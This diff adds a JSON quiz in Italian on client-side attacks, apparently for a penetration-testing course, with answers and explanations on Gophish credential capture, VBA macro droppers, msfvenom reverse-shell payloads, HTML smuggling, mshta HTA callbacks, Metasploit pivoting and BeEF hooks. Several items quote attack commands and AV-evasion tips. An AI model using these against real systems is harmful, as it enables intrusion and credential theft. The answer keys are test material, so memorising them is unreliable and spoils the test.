@@ -1,0 +1,310 @@
+{
+  "module": "Client-Side Attacks",
+  "blocks": [
+    {
+      "after_h2": "3. Client-Side Information Gathering & Fingerprinting",
+      "title": "Concetti base, attack vectors e fingerprinting",
+      "questions": [
+        {
+          "q": "Quale caratteristica distingue un client-side attack da un server-side attack?",
+          "choices": [
+            "Sfrutta vulnerabilità di rete a livello 3",
+            "Richiede sempre un'interazione dell'utente (click, apertura allegato, ecc.)",
+            "Funziona solo se l'attaccante ha già accesso fisico al dispositivo",
+            "Bypassa qualsiasi firewall perimetrale a prescindere"
+          ],
+          "correct": 1,
+          "explanation": "I client-side attack richiedono SEMPRE un'azione della vittima (aprire un allegato, cliccare un link, abilitare una macro). Senza interazione il payload non viene eseguito."
+        },
+        {
+          "q": "Quale tra questi NON è un client-side attack vector?",
+          "choices": [
+            "Spear phishing email con allegato .docm macro-enabled",
+            "HTML smuggling che consegna un EXE via Blob API",
+            "SQL injection time-based su un endpoint REST pubblico",
+            "Fake update browser via BeEF"
+          ],
+          "correct": 2,
+          "explanation": "SQLi è server-side: colpisce il database backend e non richiede interazione dell'utente. Gli altri 3 sono tutti client-side."
+        },
+        {
+          "q": "Il browser fingerprinting si usa per:",
+          "choices": [
+            "Crackare gli hash NTLM del browser",
+            "Adattare l'exploit/payload al browser, versione, OS e plugin della vittima",
+            "Sostituire il certificato TLS del sito target",
+            "Iniettare automaticamente shellcode in qualsiasi pagina visitata"
+          ],
+          "correct": 1,
+          "explanation": "Il fingerprinting raccoglie info su browser/OS/plugin per scegliere il payload corretto (es. HTA solo su Windows + IE/Edge, ActiveX solo su MSIE). È la base di tool come BeEF."
+        },
+        {
+          "q": "Qual è la differenza tra Pretexting e Phishing?",
+          "choices": [
+            "Pretexting è la creazione di una storia/contesto credibile, phishing è il canale di consegna (email/SMS/voce)",
+            "Pretexting è solo verbale, phishing è solo via email",
+            "Sono sinonimi",
+            "Pretexting funziona solo sui dirigenti, phishing solo sui dipendenti junior"
+          ],
+          "correct": 0,
+          "explanation": "Il pretexting è la fabbricazione del contesto (es. fingersi IT support); il phishing è la modalità con cui quel pretesto viene consegnato (email, SMS, telefono)."
+        },
+        {
+          "q": "Quale tecnica di social engineering targetizza specificamente alti dirigenti (CEO, CFO)?",
+          "choices": [
+            "Vishing",
+            "Smishing",
+            "Whaling",
+            "Pretexting"
+          ],
+          "correct": 2,
+          "explanation": "Whaling = caccia alle 'balene', ovvero i target più di valore in azienda (executive). Vishing usa la voce, smishing l'SMS, pretexting è generale."
+        }
+      ]
+    },
+    {
+      "after_h2": "6. Phishing infrastructure — Gophish end-to-end",
+      "title": "Social engineering, pretexting, Gophish",
+      "questions": [
+        {
+          "q": "In Gophish, quale entità contiene da chi viene mandata l'email e l'SMTP server da usare?",
+          "choices": [
+            "Email Template",
+            "Sending Profile",
+            "Landing Page",
+            "Group"
+          ],
+          "correct": 1,
+          "explanation": "Il Sending Profile in Gophish definisce From, host SMTP, credenziali e nome visualizzato. L'Email Template è solo il contenuto HTML/testo dell'email."
+        },
+        {
+          "q": "Quale URL placeholder di Gophish viene sostituito dinamicamente con un link tracciato univoco per ogni vittima?",
+          "choices": [
+            "{{.URL}}",
+            "{{TARGET}}",
+            "{phish_link}",
+            "$LINK$"
+          ],
+          "correct": 0,
+          "explanation": "Gophish usa la sintassi Go template: `{{.URL}}` viene rimpiazzato col link univoco. Altri placeholder utili: `{{.FirstName}}`, `{{.Email}}`, `{{.TrackingURL}}`."
+        },
+        {
+          "q": "Che ruolo ha la Landing Page in Gophish?",
+          "choices": [
+            "L'email che la vittima riceve",
+            "La pagina HTML servita quando la vittima clicca il link tracciato — può catturare credenziali o servire un payload",
+            "Il pannello admin di Gophish",
+            "Il log dei click in tempo reale"
+          ],
+          "correct": 1,
+          "explanation": "La Landing Page è la pagina che Gophish serve quando la vittima clicca il link nell'email. Può essere clone di un login form (per stealing credenziali) o servire un payload (drive-by)."
+        },
+        {
+          "q": "Quale parametro di Gophish trasforma una Landing Page in un'arma per furto credenziali?",
+          "choices": [
+            "Enable Capture-Credentials toggle",
+            "Set Method = STEAL",
+            "Inserire `<form action=phish:save>` nell'HTML",
+            "Niente, Gophish non supporta il furto di credenziali"
+          ],
+          "correct": 0,
+          "explanation": "Nelle opzioni della Landing Page c'è il toggle 'Capture Credentials' (e 'Capture Passwords'). Una volta attivato, qualsiasi form POST viene loggato nel dashboard."
+        },
+        {
+          "q": "In un workflow Gophish end-to-end, qual è l'ordine corretto di setup?",
+          "choices": [
+            "Campaign → Group → Template → Profile",
+            "Sending Profile → Email Template → Landing Page → Users & Groups → Campaign",
+            "Template → URL → Send",
+            "Campaign → Sending Profile → Group"
+          ],
+          "correct": 1,
+          "explanation": "L'ordine logico è: prima i 'building blocks' (profilo SMTP, template email, landing page, lista target), poi la Campagna che li lega insieme. La Campaign è sempre l'ultima."
+        }
+      ]
+    },
+    {
+      "after_h2": "9. ActiveX Controls per macro execution",
+      "title": "Resource Development, Weaponization, VBA Macros",
+      "questions": [
+        {
+          "q": "Qual è la differenza tra Resource Development e Weaponization?",
+          "choices": [
+            "Sono sinonimi",
+            "Resource Development = creazione di tool/infrastruttura; Weaponization = combinazione del payload in un artefatto consegnabile",
+            "Resource Development è solo legale, Weaponization è solo illegale",
+            "Weaponization viene prima, Resource Development dopo"
+          ],
+          "correct": 1,
+          "explanation": "Resource Development (TA0042 MITRE) = preparare risorse (account, infra, tool, payload). Weaponization = combinare il payload in un deliverable (es. .docm con macro+exe embedded). RD viene prima."
+        },
+        {
+          "q": "Quale subroutine VBA si esegue automaticamente quando un documento Word viene aperto e contiene una macro?",
+          "choices": [
+            "Sub Main()",
+            "Sub Document_Open() o Sub AutoOpen()",
+            "Sub Workbook_Open()",
+            "Sub WindowsForms_Load()"
+          ],
+          "correct": 1,
+          "explanation": "Word triggera `Document_Open()` (modulo ThisDocument) o `AutoOpen()` (modulo standard). Per Excel è `Workbook_Open()`."
+        },
+        {
+          "q": "Quale comando msfvenom genera un payload pronto per essere incollato in una macro VBA?",
+          "choices": [
+            "msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=.. LPORT=.. -f vba",
+            "msfvenom --vba-macro=on -p windows/meter⁠preter/reverse_tcp",
+            "msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=.. LPORT=.. -e vba_encoded",
+            "msfvenom -t vba -o macro.bas"
+          ],
+          "correct": 0,
+          "explanation": "Il flag `-f vba` produce direttamente il codice VBA (decoder + shellcode allocato via Virtual⁠Alloc/Create⁠Thread) pronto per essere incollato nell'editor macro."
+        },
+        {
+          "q": "A cosa serve un ActiveX control (es. CommandButton) in un documento weaponizzato?",
+          "choices": [
+            "A bypassare l'antivirus automaticamente",
+            "A triggerare l'esecuzione di una macro al click/cambio focus, evitando le subroutine Auto_Open/Document_Open che gli AV ispezionano di più",
+            "A criptare il documento",
+            "A iniettare shellcode direttamente nel kernel"
+          ],
+          "correct": 1,
+          "explanation": "Gli ActiveX controls permettono trigger custom (Click, Change, Enter) e aiutano a evitare le subroutine 'classiche' che AV/EDR ispezionano per primo. Tecnica per ridurre la detection."
+        },
+        {
+          "q": "Cosa fa un VBA PowerShell Dropper?",
+          "choices": [
+            "Cripta il documento Office",
+            "Esegue tramite VBA un comando `powershell -nop -w hidden -enc <BASE64>` che a sua volta scarica/lancia il payload reale (es. IEX cradle)",
+            "Disabilita PowerShell sul target",
+            "Logga le password di Windows"
+          ],
+          "correct": 1,
+          "explanation": "Il dropper VBA si limita ad invocare PowerShell con un comando encoded (download cradle). PS poi scarica/esegue il payload vero. È la tecnica più usata per separare loader e payload."
+        }
+      ]
+    },
+    {
+      "after_h2": "12. HTML Smuggling — delivery via Blob API",
+      "title": "HTA, MacroPack, HTML Smuggling",
+      "questions": [
+        {
+          "q": "Qual è l'eseguibile LOLBin che esegue file `.hta`?",
+          "choices": [
+            "wscript.exe",
+            "rundll32.exe",
+            "mshta.exe",
+            "regsvr32.exe"
+          ],
+          "correct": 2,
+          "explanation": "`mshta.exe` (Microsoft HTML Application Host) è il binario Windows legittimo che esegue HTA. È un LOLBin classico per initial access. Path: `C:\\Windows\\System32\\mshta.exe`."
+        },
+        {
+          "q": "Cosa rende un HTA pericoloso rispetto a una semplice pagina HTML?",
+          "choices": [
+            "L'estensione .hta forza il browser a navigarci",
+            "Gira via mshta.exe FUORI dal sandbox del browser, con i privilegi dell'utente, e ha accesso completo a WSH/ActiveX/COM",
+            "È firmato digitalmente da Microsoft",
+            "Si esegue solo su Linux"
+          ],
+          "correct": 1,
+          "explanation": "Un HTA è eseguito da mshta.exe come applicazione completa (non come pagina web): può istanziare ActiveX, lanciare PowerShell, accedere al filesystem. Niente sandbox = full user privileges."
+        },
+        {
+          "q": "Qual è il flag MacroPack per generare un documento Word weaponizzato con offuscazione delle stringhe?",
+          "choices": [
+            "macro_pack.exe --word --obfuscate -o doc.docm",
+            "macro_pack.exe -t WORD -G doc.docm -o --obfuscate",
+            "macro_pack.exe -t WORD --obfuscate-form -G doc.docm",
+            "macro_pack.exe --gen=word --crypt"
+          ],
+          "correct": 2,
+          "explanation": "Sintassi corretta: `-t WORD` (target type), `--obfuscate-form` (offusca strings/var names), `-G <file>` (generate). Esempio completo: `macro_pack.exe -t WORD --obfuscate-form -G evil.docm`."
+        },
+        {
+          "q": "Cosa fa l'HTML smuggling con Blob API?",
+          "choices": [
+            "Carica il file su un server remoto in background",
+            "Costruisce un file binario lato browser via JavaScript (Blob + URL.createObjectURL) bypassando i filtri di rete che ispezionano gli allegati email",
+            "Cifra l'HTML con AES-256",
+            "Bypassa CORS"
+          ],
+          "correct": 1,
+          "explanation": "L'HTML smuggling costruisce il payload (es. EXE) lato client da un blob JavaScript embedded. Gli web proxy/firewall non vedono mai il file passare via rete: viene 'ricomposto' nel browser. Bypass classico di SEG/proxy."
+        },
+        {
+          "q": "Quale di questi formati è il template HTA classico per dropper Metasploit?",
+          "choices": [
+            "exploit/multi/handler",
+            "exploit/windows/misc/hta_server",
+            "auxiliary/server/hta_dropper",
+            "post/windows/hta/payload"
+          ],
+          "correct": 1,
+          "explanation": "Il modulo Metasploit `exploit/windows/misc/hta_server` genera un endpoint che serve l'HTA con payload embedded. Vittima esegue `mshta.exe http://<msf>/<id>.hta` → callback Meterpreter."
+        }
+      ]
+    },
+    {
+      "after_h2": "14. Lab end-to-end #2 — Browser shell via BeEF (video 025)",
+      "title": "Lab end-to-end: Spear Phishing chain + BeEF",
+      "questions": [
+        {
+          "q": "Nel lab spear phishing del corso, dopo aver ottenuto la Meterpreter session su demo.ine.local quale comando aggiunge una route Metasploit alla subnet interna?",
+          "choices": [
+            "route add 10.10.20.0/28 1",
+            "run autoroute -s 10.10.20.0/28",
+            "set ROUTE 10.10.20.0/28",
+            "autoroute -d 10.10.20.0 -m 28"
+          ],
+          "correct": 1,
+          "explanation": "Si usa il post module `run autoroute -s <subnet>`. Aggiunge la route nel routing table di Metasploit, abilitando moduli/proxychains a pivotare via quella session."
+        },
+        {
+          "q": "Quale payload si usa per exploitare BadBlue (vulnerabilità interna raggiungibile solo via pivot)?",
+          "choices": [
+            "windows/meter⁠preter/reverse_tcp",
+            "windows/meter⁠preter/reverse_https",
+            "windows/meter⁠preter/bind_tcp",
+            "linux/x86/shell_rev⁠erse_tcp"
+          ],
+          "correct": 2,
+          "explanation": "Quando l'attaccante NON è raggiungibile dal target (subnet interna), si usa `bind_tcp`: il target apre una porta in ascolto e Metasploit ci si collega via socks_proxy/autoroute."
+        },
+        {
+          "q": "Quale porta SOCKS è di default per il modulo Metasploit `auxiliary/server/socks_proxy` (versione moderna)?",
+          "choices": [
+            "1080",
+            "8080",
+            "9050",
+            "4444"
+          ],
+          "correct": 2,
+          "explanation": "9050 è la default attuale (e coincide con il default di `/etc/proxychains.conf`). I tutorial vecchi mostrano 1080, ma la versione corrente è 9050."
+        },
+        {
+          "q": "Quando usi `proxychains nmap` attraverso un SOCKS proxy Metasploit, qual è la combinazione di flag obbligatoria?",
+          "choices": [
+            "-sS -T4",
+            "-sT -Pn",
+            "-sU -A",
+            "-O --reason"
+          ],
+          "correct": 1,
+          "explanation": "SOCKS supporta solo TCP connect: serve `-sT`. E `-Pn` per saltare host discovery (ICMP non passa via SOCKS). Senza queste flag il pivot scan fallisce silenziosamente."
+        },
+        {
+          "q": "In BeEF, su quale porta gira di default sia il pannello admin che il server di hook?",
+          "choices": [
+            "3000",
+            "8080",
+            "8443",
+            "443"
+          ],
+          "correct": 0,
+          "explanation": "BeEF default port è 3000. Pannello admin: `http://localhost:3000/ui/panel`. Hook script: `http://<beef>:3000/hook.js` da includere in `<script src=>` di una pagina hostata."
+        }
+      ]
+    }
+  ]
+}
